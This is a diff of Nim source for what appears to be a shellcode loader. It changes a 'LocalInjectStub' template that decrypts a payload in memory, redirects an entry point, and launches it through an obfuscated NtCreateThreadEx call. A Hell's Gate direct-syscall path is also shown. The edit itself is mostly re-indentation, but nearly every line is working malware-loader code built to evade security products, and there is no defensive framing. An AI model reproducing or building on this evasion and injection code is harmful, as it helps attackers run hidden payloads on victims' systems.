@@ -139,7 +139,7 @@ let LocalInjectStub*  = """
             var newEntry: LPVOID
             newEntry = prepEntry(-1, buffer, jmpMod, jmpFunc)
             when defined(verbose):
-                echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry))
+                echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"
 
         when not defined(AllocateDripStyle):
             when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
@@ -229,21 +229,21 @@ let LocalInjectStub*  = """
                         ptrEncText = cast[ptr byte](buffer)
                         ptrDecText = cast[ptr byte](buffer)
                         decryptLate()
-                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
-                NtWaitForSingleObject(tHandle, 0, nil)
-                when defined(JmpEntry):
-                    Sleep(1000)
-                    if(restoreBytes(-1, buffer)):
-                        when defined(verbose):
-                            echo obf("[*] Restored bytes!")
-                    else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to restore bytes!")
-                Wait()
-                status = zuatzuastdiasyy(tHandle)
-                status = zuatzuastdiasyy(pHandle)
-                when defined(verbose):
-                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                    status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
+                    NtWaitForSingleObject(tHandle, 0, nil)
+                    when defined(JmpEntry):
+                        Sleep(1000)
+                        if(restoreBytes(-1, buffer)):
+                            when defined(verbose):
+                                echo obf("[*] Restored bytes!")
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to restore bytes!")
+                    Wait()
+                    status = zuatzuastdiasyy(tHandle)
+                    status = zuatzuastdiasyy(pHandle)
+                    when defined(verbose):
+                        echo obf("[*] NtCreateThreadEx: "), toHex(status)
             else:    
                 when defined(Hellsgate):
                     if getSyscall(ntCreateTable):
